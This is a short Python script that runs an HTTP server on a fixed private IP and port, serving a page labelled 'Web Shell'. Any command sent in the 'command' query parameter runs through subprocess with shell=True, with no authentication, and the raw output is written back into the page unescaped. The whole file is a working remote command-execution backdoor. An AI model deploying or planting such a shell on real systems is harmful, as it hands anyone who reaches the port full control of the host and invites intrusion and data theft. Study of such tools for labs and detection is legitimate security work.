import http.server
import socketserver
import os
import subprocess
from urllib.parse import urlparse, parse_qs

ipaddr = '10.9.3.102'
port = 4200

class MyHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            parsed = urlparse(self.path)
            if parsed.path == '/':
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write('''<html>
                    <head>
                        <title>Web Shell</title>
                    </head>
                    <body>
                        <h2>Web Shell</h2>
                        <form method="get" action="/run-command">
                            <label for="command">Enter command:</label>
                            <input type="text" id="command" name="command" required>
                            <input type="submit" value="Run">
                        </form>
                        <div>
                            <h3>Command Output:</h3>
                            <pre>{}</pre>
                        </div>
                    </body>
                    </html>'''.format('').encode('utf-8'))
            elif parsed.path == '/run-command':
                command = parse_qs(parsed.query)['command'][0]
                result = self.run_command(command)
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write('''<html>
                    <head>
                        <title>Web Shell</title>
                    </head>
                    <body>
                        <h2>Web Shell</h2>
                        <form method="get" action="/run-command">
                            <label for="command">Enter command:</label>
                            <input type="text" id="command" name="command" required>
                            <input type="submit" value="Run">
                        </form>
                        <div>
                            <h3>Command Output:</h3>
                            <pre>{}</pre>
                        </div>
                    </body>
                    </html>'''.format(result).encode('utf-8'))
            else:
                self.send_error(404, 'Not Found')

        except Exception as e:
            print(f"Error: {e}")
            self.send_error(500, 'Internal Server Error: {}'.format(str(e)).encode('utf-8'))

    def run_command(self, command):
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
            return output
        except subprocess.CalledProcessError as e:
            return f"Error: {e.output}"

if __name__ == '__main__':
    handler = MyHandler
    with socketserver.TCPServer((ipaddr, port), handler) as httpd:
        print(f"Server started at http://{ipaddr}:{port}")
        httpd.serve_forever()
